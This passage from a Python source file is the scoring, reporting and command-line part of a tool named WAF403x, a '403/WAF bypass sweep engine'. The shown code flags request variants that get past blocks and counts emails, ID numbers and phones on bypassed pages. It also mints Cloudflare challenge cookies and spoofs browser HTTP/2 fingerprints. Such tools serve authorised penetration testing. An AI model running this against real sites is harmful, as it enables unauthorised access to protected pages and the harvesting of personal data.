    # blocked and the same body with the payload past the window is served.
    pairs = {}
    for i, v in enumerate(variants):
        if "pair" in v:
            pairs.setdefault(v["pair"], {})[v["role"]] = i
    for d in pairs.values():
        pi = d.get("padded")
        ci = d.get("ctl")
        if pi is None or ci is None:
            continue
        if (rows[ci]["verdict"] == "BLOCKED"
                and 200 <= rows[pi]["status"] < 400 and rows[pi]["bytes"] > 0
                and results[pi][1].body != results[ci][1].body):
            rows[pi]["verdict"] = "BYPASS"

    # Impact oracle: replay every BYPASS with a harmless payload through the
    # same transform. Identical response means the transform itself slipped
    # past the WAF (access), a different response means the payload changed
    # app behaviour (payload).
    impact = {"payload": 0, "access": 0, "unknown": 0}
    if args.impact:
        for i, row in enumerate(rows):
            row["impact"] = None
            if row["verdict"] != "BYPASS":
                continue
            twin = twin_variant(variants[i], t, args.param, args.profile)
            if twin is None:
                row["impact"] = "unknown"
            else:
                tr = fetch(t, twin, timeout, delay, opts, jar, jar_lock)
                orig = results[i][1]
                if tr.status != orig.status or tr.body != orig.body:
                    row["impact"] = "payload"
                else:
                    row["impact"] = "access"
            impact[row["impact"]] += 1

    for i, row in enumerate(rows):
        if row["verdict"] == "BYPASS" and row.get("finding") is None:
            row["finding"] = finding(results[i][1])

    # stability gate: identical bytes, fresh connection, sequential so the
    # comparison is not perturbed by concurrent retries of other candidates.
    repeat = max(0, int(args.repeat))
    candidates = [i for i, r in enumerate(rows) if r["verdict"] in ("BYPASS", "DIFF")]
    confirmed = 0
    for idx in candidates:
        r0 = results[idx][1]
        h0 = hashlib.sha256(r0.body).digest()
        stable = True
        sent = 0
        for _ in range(repeat):
            r2 = fetch(t, variants[idx], timeout, delay, opts, jar, jar_lock)
            sent += 1
            if r2.status != r0.status or hashlib.sha256(r2.body).digest() != h0:
                stable = False
                break
        rows[idx]["stable"] = stable
        rows[idx]["retries"] = sent
        if stable:
            confirmed += 1
        else:
            rows[idx]["verdict"] = "UNSTABLE"

    counts = {"BYPASS": 0, "BLOCKED": 0, "NOTFOUND": 0, "DIFF": 0,
              "ERROR": 0, "UNSTABLE": 0, "CHALLENGE": 0}
    for r in rows:
        counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1

    # A control page that looks like the baseline means the soft-404 has the
    # same shape as the app, so body similarity cannot separate a bypass from
    # ordinary routing.
    masked = (base.status != 0 and base.status == ctrl.status
              and similarity(base.text(), ctrl.text()) >= 0.90)

    summary = {"variants": len(rows), "repeat": repeat, "masked": masked,
               "impact": impact if args.impact else None,
               "stability": {"retried": len(candidates), "confirmed": confirmed}}
    summary.update(counts)
    data = {
        "url": args.url,
        "mode": args.mode,
        "level": args.level,
        "param": args.param,
        "profile": args.profile,
        "http2": args.http2,
        "follow": opts["follow"],
        "cookies": jar is not None,
        "max_body": opts["max_body"],
        "challenge": challenge,
        "payload": payload,
        "baseline": {"method": base_v["method"], "target": base_v["target"],
                     "status": base.status, "bytes": base.length,
                     "challenge": challenge_kind(base),
                     "snippet": snippet(base), "blocked": not 200 <= base.status < 400},
        "control": {"status": ctrl.status, "bytes": ctrl.length,
                    "snippet": snippet(ctrl)},
        "rows": rows,
        "summary": summary,
    }
    return data, (0 if counts["BYPASS"] else 1)


def render(data, as_json):
    if as_json:
        return json.dumps(data, indent=2, ensure_ascii=False)
    out = []
    out.append("[*] target   %s   mode=%s   level=%d   param=%s   profile=%s"
               % (data["url"], data["mode"], data["level"], data["param"],
                  data["profile"]))
    if data["http2"] != "off":
        out.append("[*] transport h2 (ALPN h2) profile=%s follow=%d cookies=%s"
                   % (data["http2"], data["follow"], data["cookies"]))
    elif data["follow"] or data["cookies"]:
        out.append("[*] transport h1 follow=%d cookies=%s"
                   % (data["follow"], data["cookies"]))
    if data.get("challenge"):
        ch = data["challenge"]
        out.append("[*] challenge solver cookies=%d status=%s title=%r solved=%s"
                   % (ch["cookies"], ch["status"], ch["title"],
                      not ch["challenge_page"]))
    out.append("[*] payload  %s" % data["payload"])
    out.append("[*] baseline %s %s -> %s / %d bytes  \"%s\""
               % (data["baseline"]["method"], data["baseline"]["target"],
                  data["baseline"]["status"], data["baseline"]["bytes"],
                  data["baseline"]["snippet"]))
    if not data["baseline"]["blocked"]:
        out.append("[i] baseline already returns 2xx (nothing is being blocked); "
                   "BYPASS rows cannot be proven against it")
    if data["baseline"].get("challenge"):
        out.append("[!] baseline is a JS/CAPTCHA challenge (%s); rerun with "
                   "--solve-challenge to mint cookies in a browser"
                   % data["baseline"]["challenge"])
    out.append("[*] control  GET -> %s / %d bytes  \"%s\""
               % (data["control"]["status"], data["control"]["bytes"],
                  data["control"]["snippet"]))
    if data["summary"]["masked"]:
        out.append("[!] soft-404 masking: control and baseline share status and "
                   "body; DIFF rows are not evidence")
    out.append("")
    out.append("%-9s %-22s %-6s %-7s %-6s %-9s %s"
               % ("MODE", "VARIANT", "METHOD", "STATUS", "BYTES", "VERDICT", "SNIPPET"))
    out.append("-" * 100)
    for r in data["rows"]:
        out.append("%-9s %-22s %-6s %-7s %-6s %-9s %s"
                   % (r["mode"], r["variant"], r["method"], r["status"],
                      r["bytes"], r["verdict"], r["snippet"]))
    out.append("")
    s = data["summary"]
    st = s["stability"]
    out.append("[+] SUMMARY variants=%d bypass=%d blocked=%d notfound=%d diff=%d "
               "error=%d unstable=%d challenge=%d"
               % (s["variants"], s["BYPASS"], s["BLOCKED"], s["NOTFOUND"],
                  s["DIFF"], s["ERROR"], s["UNSTABLE"], s["CHALLENGE"]))
    if s["repeat"]:
        out.append("[i] stability: %d/%d confirmed"
                   % (st["confirmed"], st["retried"]))
    if s.get("impact"):
        imp = s["impact"]
        out.append("[i] impact: payload=%d access=%d unknown=%d "
                   "(access = transform slipped through, app response unchanged)"
                   % (imp["payload"], imp["access"], imp["unknown"]))
    else:
        out.append("[i] stability: disabled (--repeat 0)")
    byp = [r for r in data["rows"] if r["verdict"] == "BYPASS"]
    if byp:
        out.append("[+] BYPASS rows: " + ", ".join(
            "%s/%s(%d)" % (r["mode"], r["variant"], r["status"]) for r in byp))
    else:
        out.append("[+] BYPASS rows: none")
    uns = [r for r in data["rows"] if r["verdict"] == "UNSTABLE"]
    if uns:
        out.append("[!] UNSTABLE rows: " + ", ".join(
            "%s/%s(%d)" % (r["mode"], r["variant"], r["status"]) for r in uns))
    findings = [r for r in data["rows"] if r.get("finding")]
    if findings:
        out.append("")
        out.append("[+] FINDINGS (baseline %s -> bypass %s)"
                   % (data["baseline"]["status"],
                      ",".join(sorted(set(str(r["status"]) for r in findings)))))
        for r in findings:
            f = r["finding"]
            out.append("  %-9s %-22s %s->%d impact=%s title=%r emails=%d niks=%d "
                       "phones=%d links=%d sensitive=%s"
                       % (r["mode"], r["variant"],
                          data["baseline"]["status"], r["status"],
                          r.get("impact") or "-", f["title"], f["emails"],
                          f["niks"], f["phones"], f["links"],
                          ",".join(f["sensitive"]) or "-"))
            if f["snippet"]:
                out.append("            \"%s\"" % f["snippet"][:120])
    return "\n".join(out)


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="403/WAF bypass sweep engine (raw socket request-target)")
    ap.add_argument("-u", "--url", default=None, help="target URL")
    ap.add_argument("-V", "--version", action="store_true",
                    help="print banner and version")
    ap.add_argument("--banner", action="store_true", help="print banner")
    ap.add_argument("--mode", default="all",
                    choices=["path", "header", "method", "body", "encoding",
                             "cookie", "ctype", "size", "h2", "all"],
                    help="variant family to sweep (default: all)")
    ap.add_argument("--profile", default="generic", choices=sorted(PROFILE_LIMITS),
                    help="vendor profile selecting the size-family limits")
    ap.add_argument("--http2", default="off",
                    choices=["off", "chrome", "firefox", "safari", "nghttp2",
                             "plain"],
                    help="send every request over h2 with this client "
                         "fingerprint profile (default: off)")
    ap.add_argument("--follow", type=int, default=0, metavar="N",
                    help="follow up to N same-host redirects (default 0)")
    ap.add_argument("--cookies", action="store_true",
                    help="keep a Set-Cookie jar for the whole run")
    ap.add_argument("--solve-challenge", action="store_true",
                    help="mint Cloudflare cookies with challenge.py in the "
                         "solver venv, then reuse them for raw requests")
    ap.add_argument("--solver-python", default=None,
                    help="interpreter with scrapling installed (default: "
                         "./.venv/bin/python when present)")
    ap.add_argument("--solver-timeout", type=float, default=120.0,
                    help="challenge solver timeout seconds (default 120)")
    ap.add_argument("--solver-refresh", action="store_true",
                    help="ignore the cached cf_clearance and solve again")
    ap.add_argument("--max-body", type=int, default=MAX_BODY, metavar="BYTES",
                    help="response body cap in bytes (default %d)" % MAX_BODY)
    ap.add_argument("--ciphers", default=None,
                    help="OpenSSL cipher list, e.g. AES128-SHA:AES256-SHA")
    ap.add_argument("--tls-min", default=None,
                    choices=["TLSv1", "TLSv1_1", "TLSv1_2", "TLSv1_3"],
                    help="minimum TLS version")
    ap.add_argument("--tls-max", default=None,
                    choices=["TLSv1", "TLSv1_1", "TLSv1_2", "TLSv1_3"],
                    help="maximum TLS version")
    ap.add_argument("--alpn", default=None, choices=["http/1.1", "h2"],
                    help="ALPN protocol for h1 transport (h2 mode forces h2)")
    ap.add_argument("--level", type=int, default=4, choices=[1, 2, 3, 4],
                    help="escalation level: 1 obvious, 2 single differential, "
                         "3 double layer, 4 null framing/size windows (default 4)")
    ap.add_argument("--no-impact", dest="impact", action="store_false",
                    help="skip the benign-twin impact oracle for BYPASS rows")
    ap.add_argument("--repeat", type=int, default=2,
                    help="stability re-sends per BYPASS/DIFF candidate (default 2)")
    ap.add_argument("--param", default="q", help="query parameter to inject (default: q)")
    ap.add_argument("--payload", default=None, help="payload string")
    ap.add_argument("--preset", default=None, choices=sorted(PRESETS),
                    help="named payload preset")
    ap.add_argument("-t", "--threads", type=int, default=8, help="worker threads (default 8)")
    ap.add_argument("--timeout", type=float, default=10.0, help="per-request timeout seconds")
    ap.add_argument("--delay", type=float, default=0.0, help="delay between requests (seconds)")
    ap.add_argument("--json", action="store_true", help="emit JSON")
    ap.add_argument("-o", "--out", default=None, help="write output to file")
    args = ap.parse_args(argv)
    if args.banner or args.version:
        sys.stdout.write(BANNER.lstrip("\n") + "\n")
        if args.version:
            sys.stdout.write("WAF403x %s\n" % VERSION)
        return 0
    if not args.url:
        ap.error("-u/--url is required")

    try:
        data, code = run(args)
    except ValueError as exc:
        sys.stderr.write("[x] %s\n" % exc)
        return 2
    except KeyboardInterrupt:
        sys.stderr.write("[x] interrupted\n")
        return 2
    if data is None:
        return code

    text = render(data, args.json)
    sys.stdout.write(text + "\n")
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write(text + "\n")
    return code


if __name__ == "__main__":
    sys.exit(main())
